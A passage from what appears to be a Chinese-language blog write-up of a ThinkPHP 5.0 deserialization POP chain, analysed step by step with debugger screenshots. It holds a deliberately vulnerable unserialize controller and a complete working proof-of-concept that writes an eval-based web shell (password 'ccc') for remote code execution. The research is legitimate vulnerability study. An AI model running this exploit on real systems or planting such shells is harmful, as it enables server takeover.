class="string">&quot;&quot;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;ThinkPHP5_Unserialize:\n&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$input</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&lt;style type=&quot;text/css&quot;&gt;*&#123; padding: 0; margin: 0; &#125; div&#123; padding: 4px 48px;&#125; a&#123;color:#2E5CD5;cursor: pointer;text-decoration: none&#125; a:hover&#123;text-decoration:underline; &#125; body&#123; background: #fff; font-family: &quot;Century Gothic&quot;,&quot;Microsoft yahei&quot;; color: #333;font-size:18px;&#125; h1&#123; font-size: 100px; font-weight: normal; margin-bottom: 12px; &#125; p&#123; line-height: 1.6em; font-size: 42px &#125;&lt;/style&gt;&lt;div style=&quot;padding: 24px 48px;&quot;&gt; &lt;h1&gt;:) &lt;/h1&gt;&lt;p&gt; ThinkPHP V5.1&lt;br/&gt;&lt;span style=&quot;font-size:30px&quot;&gt;12载初心不改（2006-2018） - 你值得信赖的PHP框架&lt;/span&gt;&lt;/p&gt;&lt;/div&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://tajs.qq.com/stats?sId=64890268&quot; charset=&quot;UTF-8&quot;&gt;&lt;/script&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;https://e.topthink.com/Public/static/client.js&quot;&gt;&lt;/script&gt;&lt;think id=&quot;eab4b9f840753f8e7&quot;&gt;&lt;/think&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hello</span>(<span class="params"><span class="variable">$name</span> = <span class="string">&#x27;ThinkPHP5&#x27;</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;hello,&#x27;</span> . <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>访问public：<img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677493861169-edce0763-fada-49c1-b119-88272a61266d.png#averageHue=%23f5f5f5&clientId=u3b522330-9691-4&from=paste&height=828&id=ua3d2fc02&name=image.png&originHeight=1035&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=61857&status=done&style=none&taskId=u8b6bc6b4-95c2-4bfb-b24a-094f1012139&title=&width=1536" alt="image.png"><br>说明环境正常，接下来就分析链子</p>
<h2 id="（2）漏洞复现"><a href="#（2）漏洞复现" class="headerlink" title="（2）漏洞复现"></a>（2）漏洞复现</h2><p>POC：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//__destruct</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">process</span>\<span class="title class_">pipes</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Windows</span>&#123;</span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">files</span>=[];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$pivot</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;files[]=<span class="variable">$pivot</span>; <span class="comment">//传入Pivot类</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//__toString Model子类</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Pivot</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">parent</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$append</span> = [];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$error</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$output</span>,<span class="variable">$hasone</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span>=<span class="variable">$output</span>; <span class="comment">//$this-&gt;parent等于Output类</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;append=[<span class="string">&#x27;a&#x27;</span>=&gt;<span class="string">&#x27;getError&#x27;</span>];</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;error=<span class="variable">$hasone</span>;   <span class="comment">//$modelRelation=$this-&gt;error</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//getModel</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">db</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Query</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">model</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$output</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;model=<span class="variable">$output</span>; <span class="comment">//get_class($modelRelation-&gt;getModel()) == get_class($this-&gt;parent)</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">console</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Output</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title class_">private</span> $<span class="title class_">handle</span> = <span class="title class_">null</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$styles</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$memcached</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handle=<span class="variable">$memcached</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;styles=[<span class="string">&#x27;getAttr&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Relation</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">model</span>\<span class="title class_">relation</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">HasOne</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">query</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$selfRelation</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$bindAttr</span> = [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$query</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;query=<span class="variable">$query</span>; <span class="comment">//调用Query类的getModel</span></span><br><span class="line"></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;selfRelation=<span class="literal">false</span>; <span class="comment">//满足条件!$modelRelation-&gt;isSelfRelation()</span></span><br><span class="line">            <span class="variable language_">$this</span>-&gt;bindAttr=[<span class="string">&#x27;a&#x27;</span>=&gt;<span class="string">&#x27;admin&#x27;</span>];  <span class="comment">//控制__call的参数$attr</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">session</span>\<span class="title class_">driver</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Memcached</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">handler</span> = <span class="title class_">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;handler=<span class="variable">$file</span>; <span class="comment">//$this-&gt;handler等于File类</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">driver</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">File</span>&#123;</span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">options</span> = [</span><br><span class="line">            &#x27;<span class="title class_">path</span>&#x27;=&gt; &#x27;<span class="title class_">php</span>://<span class="title class_">filter</span>/<span class="title class_">convert</span>.<span class="title class_">iconv</span>.<span class="title class_">utf</span>-8.<span class="title class_">utf</span>-7|<span class="title class_">convert</span>.<span class="title class_">base64</span>-<span class="title class_">decode</span>/<span class="title class_">resource</span>=<span class="title class_">aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g</span>/../<span class="title class_">a</span>.<span class="title class_">php</span>&#x27;,</span><br><span class="line">            &#x27;<span class="title class_">cache_subdir</span>&#x27;=&gt;<span class="title class_">false</span>,</span><br><span class="line">            &#x27;<span class="title class_">prefix</span>&#x27;=&gt;&#x27;&#x27;,</span><br><span class="line">            &#x27;<span class="title class_">data_compress</span>&#x27;=&gt;<span class="title class_">false</span></span><br><span class="line">        ];</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$tag</span>=<span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title class_">file</span>=<span class="title class_">new</span> <span class="title class_">think</span>\<span class="title class_">cache</span>\<span class="title class_">driver</span>\<span class="title class_">File</span>();</span><br><span class="line">    <span class="variable">$memcached</span>=<span class="keyword">new</span> think\session\driver\<span class="title function_ invoke__">Memcached</span>(<span class="variable">$file</span>);</span><br><span class="line">    <span class="variable">$output</span>=<span class="keyword">new</span> think\console\<span class="title function_ invoke__">Output</span>(<span class="variable">$memcached</span>);</span><br><span class="line">    <span class="variable">$query</span>=<span class="keyword">new</span> think\db\<span class="title function_ invoke__">Query</span>(<span class="variable">$output</span>);</span><br><span class="line">    <span class="variable">$hasone</span>=<span class="keyword">new</span> think\model\relation\<span class="title function_ invoke__">HasOne</span>(<span class="variable">$query</span>);</span><br><span class="line">    <span class="variable">$pivot</span>=<span class="keyword">new</span> think\model\<span class="title function_ invoke__">Pivot</span>(<span class="variable">$output</span>,<span class="variable">$hasone</span>);</span><br><span class="line">    <span class="variable">$windows</span>=<span class="keyword">new</span> think\process\pipes\<span class="title function_ invoke__">Windows</span>(<span class="variable">$pivot</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$windows</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行POC得到编码，之后在URL上传参进行反序列化，反序列化之后访问<code>[http://localhost/tp5/public/a.php3b58a9545013e88c7186db11bb158c44.php](http://localhost/tp5/public/a.php3b58a9545013e88c7186db11bb158c44.php)</code>，密码为ccc，即可RCE：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677501014383-fc2f2878-deb4-41b3-9d20-72fa3347ed90.png#averageHue=%23cda977&clientId=u3b522330-9691-4&from=paste&height=786&id=u228c57b0&name=image.png&originHeight=982&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=148688&status=done&style=none&taskId=u4e572aee-48b0-4c7a-8a43-b717662ab9f&title=&width=1536" alt="image.png"></p>
<h2 id="（3）影响版本"><a href="#（3）影响版本" class="headerlink" title="（3）影响版本"></a>（3）影响版本</h2><p>在5.0.24和5.0.18可用，5.0.9不可用</p>
<h2 id="（4）POP链分析"><a href="#（4）POP链分析" class="headerlink" title="（4）POP链分析"></a>（4）POP链分析</h2><p>这个POC就比5.1的复杂许多，整整有100行，但是前面一部分还是和5.1一样的，首先下断点，然后进行调试：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677513340012-6cd758f0-58d8-4476-9bf0-a0f180b7a889.png#averageHue=%232c2e2a&clientId=u934ec687-29c8-4&from=paste&height=213&id=u38d2a250&name=image.png&originHeight=266&originWidth=1544&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=501032&status=done&style=none&taskId=ue4a6cee5-baef-476c-8747-74bfbcd3ace&title=&width=1235.2" alt="image.png"><br>入口依然是windows的析构方法，然后继续往下走又会到toString：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677513374421-341c4d95-c3cb-4676-9f0d-b743c4b6a3b0.png#averageHue=%232a2c2a&clientId=u934ec687-29c8-4&from=paste&height=438&id=u181aefab&name=image.png&originHeight=548&originWidth=1846&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1375329&status=done&style=none&taskId=u6a0fb385-2c27-4908-be49-12a33099934&title=&width=1476.8" alt="image.png"><br>这里触发的Model类的toString，上面是Conversion类的toString，在5.0版本没有Conversion这个复用类，因此在这里有点小不同，但是方法是一样的因此接下来会和5.1版本一样进入<code>toArray</code>方法：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677513629393-46b9c909-dc5c-48ca-bfe4-bdf503dd5305.png#averageHue=%232a2c28&clientId=u934ec687-29c8-4&from=paste&height=263&id=u202b8dc9&name=image.png&originHeight=329&originWidth=1262&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=550089&status=done&style=none&taskId=u799b2462-b92f-4dc5-8c54-980fc2e29d2&title=&width=1009.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677513451703-1350aac6-7436-4d8e-9341-ed79d9617bb5.png#averageHue=%232c2e2c&clientId=u934ec687-29c8-4&from=paste&height=794&id=uc1b10dc0&name=image.png&originHeight=992&originWidth=1910&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2532544&status=done&style=none&taskId=ue61902f7-b27b-4b91-ba96-4e46d5240e8&title=&width=1528" alt="image.png"><br>这里有四个比较重要的断点，首先是<code>$relation</code>的赋值，是通过parseName方法完成的，我们跟进<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677513534139-284edef2-b1da-4e50-9e24-cbce52f763e2.png#averageHue=%232b2d29&clientId=u934ec687-29c8-4&from=paste&height=329&id=uc0f05c5b&name=image.png&originHeight=411&originWidth=1301&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=680671&status=done&style=none&taskId=u0b39300c-09b9-469e-907c-8d226a6f7fa&title=&width=1040.8" alt="image.png"><br>由于这里type传入的值为1所以进入if判断，因此直接返回name（遍历($this-&gt;append而得），在这里为<code>getError</code>：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677513616310-ed5164b5-07ec-47f8-996a-bf5f6a383474.png#averageHue=%232c2d28&clientId=u934ec687-29c8-4&from=paste&height=53&id=u8f03e27e&name=image.png&originHeight=66&originWidth=920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=80441&status=done&style=none&taskId=u6889bf73-cf0c-445e-be9b-cd316fa5104&title=&width=736" alt="image.png"><br>而Model类有getError这个方法，因此进入了<code>method_exists</code>判断，然后对<code>$modelRelation</code>进行了赋值，在这里是通过<code>$this-&gt;$relation()</code>,也就是<code>$this-&gt;$getError()</code>完成的：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677513906828-ffc874ae-b08f-4522-8b4e-9c834fdc3ec0.png#averageHue=%23292b29&clientId=u934ec687-29c8-4&from=paste&height=460&id=u5a992552&name=image.png&originHeight=575&originWidth=1555&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1161274&status=done&style=none&taskId=ue0c12e6e-1652-4222-9f56-176a43ec344&title=&width=1244" alt="image.png"><br>在这里返回值可控，我们将其设置为了HasOne对象</p>
<blockquote>
<ul>
<li><input checked="" disabled="" type="checkbox"> 2023-2-28-0-05：多少又有点累了WuWuWu….</li>
</ul>
</blockquote>
<p>这里HasOne先不说为什么是它，然后进入第二个断点也就是对<code>$value</code>的赋值：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677550092072-8a6e7f6a-fa92-46ea-851b-5819fd42cd67.png#averageHue=%232a2c29&clientId=ucdcb2c75-f9bd-4&from=paste&height=694&id=u8760b724&name=image.png&originHeight=867&originWidth=1309&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1432305&status=done&style=none&taskId=ue2910afc-1433-4a61-96c3-4efedeb9e58&title=&width=1047.2" alt="image.png"></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span> &amp;&amp; !<span class="variable">$modelRelation</span>-&gt;<span class="title function_ invoke__">isSelfRelation</span>() &amp;&amp; <span class="title function_ invoke__">get_class</span>(<span class="variable">$modelRelation</span>-&gt;<span class="title function_ invoke__">getModel</span>()) == <span class="title function_ invoke__">get_class</span>(<span class="variable">$this</span>-&gt;<span class="built_in">parent</span>)) &#123;</span><br></pre></td></tr></table></figure>
<p>看这一段if判断，我们需要满足三个条件</p>
<ul>
<li>$this-&gt;parent</li>
<li>!$modelRelation-&gt;isSelfRelation()</li>
<li>get_class($modelRelation-&gt;getModel()) &#x3D;&#x3D; get_class($this-&gt;parent))</li>
<li><input checked="" disabled="" type="checkbox"> <strong>条件一：</strong></li>
</ul>
<p>首先我们要知道在toString这一步我们需要做什么，5.1版本是触发了__call方法，那么这里我们也应该寻找能否找到合适的call方法，最后结果就是<code>think\console\Output</code>类，那么我们应该让这个方法返回一个Output对象，这样在出去之后执行<code>$value-&gt;getAttr($attr)</code>才会触发<code>__call</code>魔术方法，而该方法中value的值就是<code>$this-&gt;parent</code>，所以第一个条件parent需要为Output对象</p>
<ul>
<li><input checked="" disabled="" type="checkbox"> <strong>条件二</strong></li>
</ul>
<p>对于第二个条件，<code>$modelRelation</code>我们已经完成了赋值，为<code>HasOne</code>对象，我们观察一下<code>isSelfRelation</code>方法：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677550277648-a0259219-93de-4b34-adfc-8b18a07f1087.png#averageHue=%232c2f2c&clientId=ucdcb2c75-f9bd-4&from=paste&height=734&id=u1ea5c324&name=image.png&originHeight=917&originWidth=1857&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2280110&status=done&style=none&taskId=ufbfb3cc3-1091-4bcc-8d21-8866f82098a&title=&width=1485.6" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677550289631-4285df38-b792-485a-905a-01edd020eff4.png#averageHue=%23333430&clientId=ucdcb2c75-f9bd-4&from=paste&height=66&id=uc33f5f5e&name=image.png&originHeight=83&originWidth=387&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=48059&status=done&style=none&taskId=udc15b1b1-d738-400c-9ca9-80a9640a398&title=&width=309.6" alt="image.png"><br>由于hasone类是Relation类的子类，因此我们对<code>$this-&gt;selfRelation</code>的值可控，只需让他为false即可</p>
<ul>
<li><input checked="" disabled="" type="checkbox"> <strong>条件三</strong></li>
</ul>
<p>最后一个条件需要让<code>Hasone::getModel</code>返回一个Output对象($this-&gt;parent)，观察该方法：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677550491004-75c8d036-d5b8-4b6f-9285-9d15963eea12.png#averageHue=%2331322d&clientId=ucdcb2c75-f9bd-4&from=paste&height=122&id=ub70b740a&name=image.png&originHeight=152&originWidth=577&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=121471&status=done&style=none&taskId=u2e3ac4af-45cb-4064-8f0a-7fd54dad941&title=&width=461.6" alt="image.png"><br>调用了<code>$this-&gt;query-&gt;getModel()</code>，全局搜索getModel方法，<code>/thinkphp/library/think/db/Query.php</code>中的getModel方法我们可控：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677550680798-df512e36-28da-49ba-bcc3-3604c28bcc72.png#averageHue=%23353935&clientId=ucdcb2c75-f9bd-4&from=paste&height=289&id=u303314bf&name=image.png&originHeight=361&originWidth=995&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=513032&status=done&style=none&taskId=uf341a6d3-c1e1-472e-8aba-d6acd2e0388&title=&width=796" alt="image.png"><br>在这里只需要让<code>this-&gt;query==thinkphp/library/thinl/db/Query.php</code>即可，然后让他的model属性为<code>Output</code>对象<br>完成对Value的赋值后退出来，进入第三个断点，进入<code>$modelRelation-&gt;getBindAttr()</code>：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677550775241-1f11caad-c807-4510-b841-1b4813c8c035.png#averageHue=%232b2d28&clientId=ucdcb2c75-f9bd-4&from=paste&height=403&id=ucfb3f850&name=image.png&originHeight=504&originWidth=1317&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=890211&status=done&style=none&taskId=u15243c4a-8951-4e90-891b-ec22c3ea18d&title=&width=1053.6" alt="image.png"><br>在这里<code>$modelRelation</code>为<code>Hasone</code>对象，因此调用它的<code>getBindAttr</code>方法，跟进：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677550837929-3906b4aa-38d6-44d3-9ea8-6cf862865592.png#averageHue=%232a2c29&clientId=ucdcb2c75-f9bd-4&from=paste&height=681&id=u9d88bde4&name=image.png&originHeight=851&originWidth=1353&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1426914&status=done&style=none&taskId=ud215a001-1d6d-484a-9167-d70af27cd17&title=&width=1082.4" alt="image.png"><br>返回HasOne对象的bindAttr属性，这里我们设置为一个数组<code>[&quot;a&quot;=&gt;&quot;admin&quot;]</code>，这里的admin和结果中的文件名有关</p>
<p>出来后对bindAttr进行了遍历，取出了admin的值，随后准备触发__call方法，这里value为Output对象，attr为admin：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677551217047-6c7c368e-6894-4bb9-9f55-43e05ed9a174.png#averageHue=%23292b2a&clientId=ucdcb2c75-f9bd-4&from=paste&height=606&id=uc3a7a2f5&name=image.png&originHeight=758&originWidth=1372&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1337643&status=done&style=none&taskId=u321ac68a-00ba-4ef6-bb2f-6e26d8b5c7e&title=&width=1097.6" alt="image.png"><br>进入__call方法：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677551371187-a1b1ecdd-2fbc-4477-8198-c81aee65d3fd.png#averageHue=%232a2c29&clientId=ucdcb2c75-f9bd-4&from=paste&height=696&id=u1677c945&name=image.png&originHeight=870&originWidth=1313&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1457422&status=done&style=none&taskId=u7ade28fb-b01e-407b-a251-ef81000ab77&title=&width=1050.4" alt="image.png"><br>用array_shift方法将method和args结合在了一起，随后调用<code>call_user_func_array</code>方法调用了自己的block方法，跟进该方法：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677551423622-103ca151-a028-48aa-bc04-1bf834852697.png#averageHue=%232c2d2a&clientId=ucdcb2c75-f9bd-4&from=paste&height=275&id=u8d92ec9e&name=image.png&originHeight=344&originWidth=1334&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=549893&status=done&style=none&taskId=uf9b8c1b7-7c3c-48d6-95b2-131e383d335&title=&width=1067.2" alt="image.png"><br>该方法中又调用自己的<code>writeln</code>方法，参数为<code>&lt;getAttr&gt;admin&lt;/getAttr&gt;</code>，这是上面2个变量拼贴来的<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677551476690-6c612115-de82-4d56-9250-4e935267d22f.png#averageHue=%232e2f2c&clientId=ucdcb2c75-f9bd-4&from=paste&height=150&id=uaf08c312&name=image.png&originHeight=187&originWidth=1341&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=314737&status=done&style=none&taskId=u88959c74-b9a2-4c96-87b4-2daac7c2871&title=&width=1072.8" alt="image.png"><br>跟进writeln方法调用write，参数为之前带下来的<code>&lt;getAttr&gt;admin&lt;/getAttr&gt;</code>，另外两个分别为<code>true,0</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677552107753-a584c885-9ee9-4ceb-9078-8f640ae79f5c.png#averageHue=%232c2e2a&clientId=ucdcb2c75-f9bd-4&from=paste&height=242&id=u56413936&name=image.png&originHeight=303&originWidth=1140&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=437611&status=done&style=none&taskId=u4da9342d-cf3d-4f93-a32d-144739fd540&title=&width=912" alt="image.png"><br>调用<code>$this-&gt;handle-&gt;write($messages, $newline, $type)</code>，全局搜索write方法，最终在<code>Memcached</code>类找到合适的write方法，因此让Output的handle属性为<code>Memcached</code>类：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677552186768-aeb7e7a1-abcf-48b5-838e-e0e9d290e182.png#averageHue=%232d2f2b&clientId=ucdcb2c75-f9bd-4&from=paste&height=158&id=ucc3a317d&name=image.png&originHeight=198&originWidth=1209&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=304916&status=done&style=none&taskId=ued8ddfdc-06a3-49f4-b4b3-40ae1c6d603&title=&width=967.2" alt="image.png"><br>在<code>Memcached</code>对象的write方法，调用了set方法，再找谁调用了set，最终在<code>think/cache/driver/File</code>类找到了，因此让Memcache对象的handler属性变为File对象，最后触发它的set方法，参数为上面带下来的：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677553677458-b6182615-6902-455c-93de-65841d325d18.png#averageHue=%232c2e2b&clientId=ucdcb2c75-f9bd-4&from=paste&height=518&id=u36a40fec&name=image.png&originHeight=647&originWidth=1383&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1137813&status=done&style=none&taskId=u18b1c5eb-75c5-4aa9-831e-a2147549362&title=&width=1106.4" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1677552319092-c250a93c-0158-46c6-970a-bfdd3c35ca27.png#averageHue=%23292b29&clientId=ucdcb2c75-f9bd-4&from=paste&height=590&id=u10d17720&name=image.png&originHeight=738&originWidth=1389&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1319970&status=done&style=none&taskId=u0eb2f3b8-b63f-4e34-9e91-2c9dc58c6ff&title=&width=1111.2" alt="image.png"><br>最终会调用危险函数<code>file_put_contents</code>，这里存在一个死亡函数绕过，这个在我之前的文章也有写到<br><a target="_blank" rel="noopener" 